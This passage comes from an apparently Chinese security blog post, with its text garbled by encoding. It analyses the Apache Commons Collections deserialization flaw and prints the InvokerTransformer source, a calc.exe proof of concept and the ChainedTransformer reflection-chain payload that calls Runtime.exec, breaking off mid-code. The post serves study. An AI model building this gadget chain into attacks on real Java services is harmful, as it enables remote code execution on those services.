class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨readObject()æ–¹æ³•è°ƒç”¨æ—¶Javaçš„åºåˆ—åŒ–æœºåˆ¶ä¼šå…ˆå¯»æ‰¾ç”¨æˆ·æ˜¯å¦è‡ªå®šä¹‰äº†readObject()æ–¹æ³•ï¼Œè‹¥æœ‰åˆ™ç›´æ¥è°ƒç”¨è¯¥è‡ªå®šä¹‰çš„æ–¹æ³•è€Œéé»˜è®¤çš„readObject()æ–¹æ³•ï¼š</p><p><img src="/2019/02/06/Javaååºåˆ—åŒ–æ¼æ´/1.png" alt="é‡å†™readObject()æ–¹æ³•"></p><h2 id="Apache-Commons-Collectionsååºåˆ—åŒ–æ¼æ´åˆ†æ"><a href="#Apache-Commons-Collectionsååºåˆ—åŒ–æ¼æ´åˆ†æ" class="headerlink" title="Apache Commons Collectionsååºåˆ—åŒ–æ¼æ´åˆ†æ"></a>Apache Commons Collectionsååºåˆ—åŒ–æ¼æ´åˆ†æ</h2><p>Apache Commons Collectionsæ˜¯ä¸€ä¸ªæ‰©å±•äº†Javaæ ‡å‡†åº“é‡Œçš„Collectionç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼ŒåŒ…å«äº†å¾ˆå¤šjarå·¥å…·åŒ…ï¼Œæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æ„ç±»å‹å¹¶ä¸”å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚</p><p>org.apache.commons.collectionsæä¾›ä¸€ä¸ªç±»åŒ…æ¥æ‰©å±•å’Œå¢åŠ æ ‡å‡†çš„Javaçš„collectionæ¡†æ¶ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™äº›æ‰©å±•ä¹Ÿå±äºcollectionçš„åŸºæœ¬æ¦‚å¿µï¼Œåªæ˜¯åŠŸèƒ½ä¸åŒç½¢äº†ã€‚Javaä¸­çš„collectionå¯ä»¥ç†è§£ä¸ºä¸€ç»„å¯¹è±¡ï¼Œcollectioné‡Œé¢çš„å¯¹è±¡ç§°ä¸ºcollectionçš„å¯¹è±¡ã€‚å…·è±¡çš„collectionä¸ºsetã€listã€queueç­‰ç­‰ï¼Œå®ƒä»¬æ˜¯é›†åˆç±»å‹ã€‚æ¢ä¸€ç§ç†è§£æ–¹å¼ï¼Œcollectionæ˜¯setã€listã€queueçš„æŠ½è±¡ã€‚</p><p>ä½œä¸ºApacheå¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼ŒCommons Collectionsè¢«å¹¿æ³›åº”ç”¨äºå„ç§Javaåº”ç”¨çš„å¼€å‘ï¼Œè€Œæ­£æ˜¯å› ä¸ºåœ¨å¤§é‡webåº”ç”¨ç¨‹åºä¸­è¿™äº›ç±»çš„å®ç°ä»¥åŠæ–¹æ³•çš„è°ƒç”¨ï¼Œå¯¼è‡´äº†ååºåˆ—åŒ–ç”¨æ¼æ´çš„æ™®éæ€§å’Œä¸¥é‡æ€§ã€‚</p><p>å½±å“ç‰ˆæœ¬ï¼š3.2.1åŠä»¥ä¸‹ç‰ˆæœ¬çš„Commons CollectionsåŒ…ã€‚</p><p>ä¸‹é¢å°±ç®€å•åœ°æ¨¡æ‹Ÿè¯¥åºåˆ—åŒ–æ¼æ´äº§ç”Ÿã€payloadçš„æ„é€ åŠåˆ©ç”¨è¿‡ç¨‹ã€‚è¿™é‡Œç¤ºä¾‹ç”¨çš„commons-collections-3.2.1.jaråŒ…ã€‚</p><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p>Apache Commons Collectionsä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„æ¥å£Transformerï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå®ç°è¯¥æ¥å£çš„ç±»InvokerTransformerå¯ä»¥é€šè¿‡è°ƒç”¨Javaçš„åå°„æœºåˆ¶æ¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œå…¶æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (methodName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"The method to invoke must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InvokerTransformer(methodName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (methodName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"The method to invoke must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (paramTypes == <span class="keyword">null</span> &amp;&amp; args != <span class="keyword">null</span> || paramTypes != <span class="keyword">null</span> &amp;&amp; args == <span class="keyword">null</span> || paramTypes != <span class="keyword">null</span> &amp;&amp; args != <span class="keyword">null</span> &amp;&amp; paramTypes.length != args.length) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"The parameter types must match the arguments"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (paramTypes != <span class="keyword">null</span> &amp;&amp; paramTypes.length != <span class="number">0</span>) &#123;</span><br><span class="line">            paramTypes = (Class[])((Class[])paramTypes.clone());</span><br><span class="line">            args = (Object[])((Object[])args.clone());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InvokerTransformer(methodName, paramTypes, args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InvokerTransformer(methodName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var6);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¯¥InvokerTransformerç±»æ˜¯å®ç°Transformeræ¥å£çš„ï¼ˆTransformeræ¥å£ä¸»è¦ç”¨äºè½¬æ¢å¹¶è¿”å›ä¸€ä¸ªç»™å®šçš„Objectå¯¹è±¡ï¼‰ï¼Œä¸”å…¶ä¸­çš„transform()æ–¹æ³•é‡‡ç”¨åå°„æœºåˆ¶è¿›è¡Œä»»æ„å‡½æ•°è°ƒç”¨ï¼Œè¿™å°±æ˜¯æ¼æ´ç‚¹æ‰€åœ¨ã€‚</p><p>è¿™é‡Œæ˜¯åå°„æœºåˆ¶å…³é”®çš„ä¸‰å¥ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class cls = input.getClass();</span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å¥ï¼šinputä¸ºObjectå¯¹è±¡ï¼Œè·å–å…¶å¯¹åº”çš„Classï¼›</p><p>ç¬¬äºŒå¥ï¼šè·å–clsç±»ä¸­å…·ä½“çš„æ–¹æ³•å¯¹è±¡ï¼›</p><p>ç¬¬ä¸‰å¥ï¼šæ‰§è¡Œinputå¯¹è±¡çš„methodæ–¹æ³•ï¼Œè¿”å›åŒmethodä¸€æ ·çš„è¿”å›ç±»å‹ã€‚</p><p>ä¸Šè¿°ä¸‰å¥ä»£ç å…¶å®ç­‰åŒäºä¸‹é¢çš„ä»£ç ï¼Œå³å¯ä»¥ç›´æ¥åˆå¹¶èµ·æ¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input.getClass().getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes).invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure><p>ä¸‹é¢ç¼–å†™ä»£ç è¿›è¡Œå¼¹å‡ºè®¡ç®—å™¨çš„æµ‹è¯•æ¥éªŒè¯è¯¥æ¼æ´ç‚¹æ˜¯å¦èƒ½åˆ©ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC_Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer it = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>&#125;);</span><br><span class="line">        it.transform(java.lang.Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/02/06/Javaååºåˆ—åŒ–æ¼æ´/4.png" alt="demo"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨çš„ï¼Œå³å¯ä»¥è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬ä¸èƒ½ä»å¤–éƒ¨ç›´æ¥ä¼ å…¥java.lang.Runtime.getRuntime()ï¼Œè¿™æ—¶å°±éœ€è¦æˆ‘ä»¬å»æ„é€ é“¾å¼ç»“æ„çš„payloadæ¥å®ç°æ¼æ´åˆ©ç”¨ã€‚</p><p>ä¸‹é¢å°±å¼€å§‹æ„é€ åå°„é“¾payloadæ¥å®ç°ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚</p><h3 id="1ã€é€šè¿‡åå°„æ„é€ å¯åºåˆ—åŒ–çš„æ¶æ„åå°„é“¾å¯¹è±¡"><a href="#1ã€é€šè¿‡åå°„æ„é€ å¯åºåˆ—åŒ–çš„æ¶æ„åå°„é“¾å¯¹è±¡" class="headerlink" title="1ã€é€šè¿‡åå°„æ„é€ å¯åºåˆ—åŒ–çš„æ¶æ„åå°„é“¾å¯¹è±¡"></a>1ã€é€šè¿‡åå°„æ„é€ å¯åºåˆ—åŒ–çš„æ¶æ„åå°„é“¾å¯¹è±¡</h3><p>ä¸€æ­¥æ­¥æ¥ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œè¦è®©Javaç¨‹åºæ‰§è¡Œæ‰§è¡Œå‘½ä»¤ï¼Œé€šå¸¸æ˜¯è·å–åˆ°<code>Runtime</code>çš„å®ä¾‹ï¼Œå†è°ƒç”¨å®ƒçš„<code>exec()</code>æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">runtime.exec(cmd);</span><br></pre></td></tr></table></figure><p>æ¥ç€å°†å…¶è¡¨ç¤ºä¸ºé“¾å¼ç»“æ„çš„å½¢å¼ï¼Œå› ä¸ºåº•å±‚é€šè¿‡åå°„æŠ€æœ¯è·å–å¯¹è±¡è°ƒç”¨å‡½æ•°éƒ½ä¼šå­˜åœ¨ä¸€ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œä½¿ç”¨é“¾å¼ç»“æ„çš„è¯­å¥å¯ä»¥ä¿è¯æ‰§è¡Œè¿‡ç¨‹ä¸­è¿™ä¸ªä¸Šä¸‹æ–‡æ˜¯ä¸€è‡´çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure><p>å¥½äº†ï¼Œæˆ‘ä»¬çŸ¥é“æ„é€ çš„åå°„é“¾æ˜¯è¿™ç§æ ¼å¼ï¼Œä¸‹é¢å¼€å§‹åˆ†æCommons Collectionsçš„payloadçš„é“¾å¼ç»“æ„ã€‚</p><p>Commons Collectionsä¸­æœ‰ä¸€ä¸ªç”¨äºå¯¹è±¡ä¹‹é—´è½¬æ¢çš„Transformeræ¥å£ï¼Œå…ˆçœ‹æ„é€ çš„é“¾å¼ç»“æ„payloadä¸­æ¶‰åŠåˆ°çš„å‡ ä¸ªå®ç°ç±»ï¼Œåªéœ€çœ‹å…¶æ„é€ æ–¹æ³•å’Œtransform()æ–¹æ³•å³å¯ã€‚</p><p>1ã€ConstantTransformerç±»ï¼Œæ˜¯ä¸€ä¸ªTransformeræ¥å£å®ç°ç±»ï¼Œå…¶æ„é€ æ–¹æ³•å’Œtransform()æ–¹æ³•å¦‚ä¸‹ï¼Œå¯çœ‹åˆ°transform()æ–¹æ³•ä¼šåŸå°ä¸åŠ¨åœ°è¿”å›ä¼ å…¥çš„Objectï¼Œä»è€Œå¯æ„é€ å¤–éƒ¨è¾“å…¥çš„å¸¸é‡å¦‚Runtime.classï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2ã€InvokerTransformerç±»ï¼Œåœ¨æ¼æ´ç‚¹ä¸­å·²è¯´æ˜ã€‚</p><p>3ã€ChainedTransformerç±»ï¼Œæ˜¯ä¸€ä¸ªTransformeræ¥å£å®ç°ç±»ï¼Œå…¶æ„é€ æ–¹æ³•å’Œtransform()æ–¹æ³•å¦‚ä¸‹ï¼Œå…¶transform()æ–¹æ³•ç”¨äºé“¾æ¥å¤šä¸ªæ­¥éª¤æ„é€ çš„transformerï¼Œå…¶ä¸­objectå‚æ•°ä¸ºä¸Šä¸€æ¬¡è°ƒç”¨transform()çš„è¿”å›ç»“æœï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€çœ‹ä¸‹é¢è¿™æ®µæ„é€ çš„payloadé“¾å¼ç»“æ„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>,&#125;),</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure><p>æ„é€ è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>æ„é€ ä¸€ä¸ªConstantTransformerå¯¹è±¡ï¼ŒæŠŠRuntimeçš„Classå¯¹è±¡ä¼ è¿›å»ï¼Œåœ¨transform()æ—¶ï¼Œå§‹ç»ˆä¼šè¿”å›è¿™ä¸ªå¯¹è±¡ï¼›</li><li>æ„é€ ä¸€ä¸ªInvokerTransformerå¯¹è±¡ï¼Œå¾…è°ƒç”¨æ–¹æ³•åä¸ºgetMethodï¼Œå‚æ•°ä¸ºgetRuntimeï¼Œåœ¨transform()æ—¶ï¼Œä¼ å…¥ç¬¬ä¸€æ­¥çš„ç»“æœï¼Œæ­¤æ—¶çš„inputåº”è¯¥æ˜¯java.lang.Runtimeï¼Œä½†ç»è¿‡getClass()ä¹‹åï¼Œclsä¸ºjava.lang.Classï¼Œä¹‹ågetMethod()åªèƒ½è·å–java.lang.Classçš„æ–¹æ³•ï¼Œå› æ­¤æ‰ä¼šå®šä¹‰çš„å¾…è°ƒç”¨æ–¹æ³•åä¸ºgetMethodï¼Œç„¶åå…¶å‚æ•°æ‰æ˜¯getRuntimeï¼Œå®ƒå¾—åˆ°çš„æ˜¯getMethodè¿™ä¸ªæ–¹æ³•çš„Methodå¯¹è±¡ï¼Œinvoke()è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæœ€ç»ˆå¾—åˆ°çš„æ‰æ˜¯getRuntimeè¿™ä¸ªæ–¹æ³•çš„Methodå¯¹è±¡ï¼›</li><li>æ„é€ ä¸€ä¸ªInvokerTransformerå¯¹è±¡ï¼Œå¾…è°ƒç”¨æ–¹æ³•åä¸ºinvokeï¼Œå‚æ•°ä¸ºç©ºï¼Œåœ¨transform()æ—¶ï¼Œä¼ å…¥ç¬¬äºŒæ­¥çš„ç»“æœï¼ŒåŒç†ï¼Œclså°†ä¼šæ˜¯java.lang.reflect.Methodï¼Œå†è·å–å¹¶è°ƒç”¨å®ƒçš„invoke()æ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨ä¸Šé¢çš„getRuntime()æ‹¿åˆ°Runtimeå¯¹è±¡ï¼›</li><li>æ„é€ ä¸€ä¸ªInvokerTransformerå¯¹è±¡ï¼Œå¾…è°ƒç”¨æ–¹æ³•åä¸ºexecï¼Œå‚æ•°ä¸ºå‘½ä»¤å­—ç¬¦ä¸²ï¼Œåœ¨transform()æ—¶ï¼Œä¼ å…¥ç¬¬ä¸‰æ­¥çš„ç»“æœï¼Œè·å–java.lang.Runtimeçš„execæ–¹æ³•å¹¶ä¼ å‚è°ƒç”¨ï¼›</li><li>æœ€åæŠŠå®ƒä»¬ç»„è£…æˆä¸€ä¸ªæ•°ç»„å…¨éƒ¨æ”¾è¿›ChainedTransformerä¸­ï¼Œåœ¨transform()æ—¶ï¼Œä¼šå°†å‰ä¸€ä¸ªå…ƒç´ çš„è¿”å›ç»“æœä½œä¸ºä¸‹ä¸€ä¸ªçš„å‚æ•°ï¼Œåˆšå¥½æ»¡è¶³éœ€æ±‚ã€‚</li></ol><p>æœ‰ä¸€ä¸ªé—®é¢˜â€”â€”ä¸Šé¢çš„ç¬¬2ã€3æ­¥æ˜¯ä¸æ˜¯å¯ä»¥ç®€åŒ–ä¸€ä¸‹ï¼Œè€ƒè™‘ç”¨ä¸‹é¢è¿™ç§é€»è¾‘æ›´æ¸…æ™°çš„æ–¹å¼æ¥æ„é€ å‘¢ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[] &#123; cmd &#125;)&#125;;</span><br></pre></td></tr></table></figure><p>ç­”æ¡ˆæ˜¯ä¸è¡Œçš„ã€‚è™½ç„¶å•çœ‹æ•´ä¸ªé“¾ï¼Œæ— è®ºæ˜¯å®šä¹‰è¿˜æ˜¯æ‰§è¡Œéƒ½æ˜¯æ²¡æœ‰ä»»ä½•é—®é¢˜çš„ï¼Œä½†æ˜¯åœ¨åç»­åºåˆ—åŒ–æ—¶ï¼Œç”±äºRuntime.getRuntime()å¾—åˆ°çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¹Ÿéœ€è¦å‚ä¸åºåˆ—åŒ–è¿‡ç¨‹ï¼Œè€ŒRuntimeæœ¬èº«æ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´åºåˆ—åŒ–å¤±è´¥ã€‚</p><p>æ„é€ å®Œè¿™æ¡Transformeré“¾ï¼Œå°±ç­‰ç€è°æ¥æ‰§è¡Œå®ƒçš„transform()äº†ã€‚</p><p>è¿™é‡Œå¯ä»¥å…ˆç›´æ¥åœ¨ä»£ç ä¸‹é¢æ·»åŠ <code>transformerChain.transform(null);</code>è¯­å¥æ¥æŸ¥çœ‹è¯¥Transformeré“¾æ˜¯å¦çœŸçš„å¯ä»¥æ‰§è¡Œå‘½ä»¤ä¸”è¯¥å¯¹è±¡æ˜¯å¦å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> 